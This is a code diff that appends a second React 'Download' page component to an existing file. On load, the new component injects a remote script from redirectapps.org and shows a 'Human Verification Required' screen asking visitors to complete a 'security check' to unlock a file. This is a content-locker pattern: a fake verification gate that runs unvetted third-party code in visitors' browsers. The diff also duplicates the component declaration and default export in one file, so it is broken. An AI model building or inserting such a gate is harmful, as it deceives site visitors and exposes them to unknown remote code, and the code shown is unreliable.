@@ -509,3 +509,116 @@ const Download = () => {
 };
 
 export default Download;
+
+
+// src/pages/Download.tsx
+import React, { useEffect } from "react";
+
+const Download: React.FC = () => {
+  // Load RedirectApps script dynamically
+  useEffect(() => {
+    const script = document.createElement("script");
+    script.src = "https://redirectapps.org/cp/js/pjqn6";
+    script.async = true;
+    script.type = "text/javascript";
+
+    document.body.appendChild(script);
+
+    return () => {
+      if (document.body.contains(script)) {
+        document.body.removeChild(script);
+      }
+    };
+  }, []);
+
+  return (
+    <>
+      {/* PAGE WRAPPER */}
+      <div
+        style={{
+          minHeight: "100vh",
+          background: "linear-gradient(135deg, #4c6ef5, #ae3ec9, #e64980)",
+          padding: "40px 20px",
+          color: "white",
+          fontFamily: "Poppins, sans-serif",
+        }}
+      >
+        {/* HEADER */}
+        <div style={{ textAlign: "center", marginBottom: "40px" }}>
+          <h1
+            style={{
+              fontSize: "42px",
+              fontWeight: 800,
+              marginBottom: "10px",
+              textShadow: "0 4px 15px rgba(0,0,0,0.3)",
+            }}
+          >
+            Human Verification Required
+          </h1>
+          <p
+            style={{
+              fontSize: "18px",
+              opacity: 0.9,
+              fontWeight: 500,
+            }}
+          >
+            Unlock your file by completing the quick step below.
+          </p>
+        </div>
+
+        {/* MAIN CONTENT */}
+        <div
+          style={{
+            maxWidth: "700px",
+            margin: "0 auto",
+            background: "rgba(255,255,255,0.12)",
+            borderRadius: "20px",
+            padding: "40px",
+            backdropFilter: "blur(10px)",
+            boxShadow: "0 0 30px rgba(0,0,0,0.25)",
+            textAlign: "center",
+            border: "1px solid rgba(255,255,255,0.2)",
+          }}
+        >
+          <h2
+            style={{
+              fontSize: "28px",
+              fontWeight: 700,
+              marginBottom: "10px",
+            }}
+          >
+            Verify You're Human
+          </h2>
+
+          <p
+            style={{
+              fontSize: "16px",
+              color: "rgba(255,255,255,0.9)",
+              marginBottom: "30px",
+            }}
+          >
+            Please complete the security check below to continue to your
+            download.
+          </p>
+
+          {/* CAPTCHA AUTO-SHOW */}
+          <div data-captcha-enable="true"></div>
+        </div>
+
+        {/* FOOTER */}
+        <div
+          style={{
+            marginTop: "50px",
+            textAlign: "center",
+            fontSize: "14px",
+            opacity: 0.7,
+          }}
+        >
+          © {new Date().getFullYear()} Secure Verification Gateway
+        </div>
+      </div>
+    </>
+  );
+};
+
+export default Download;
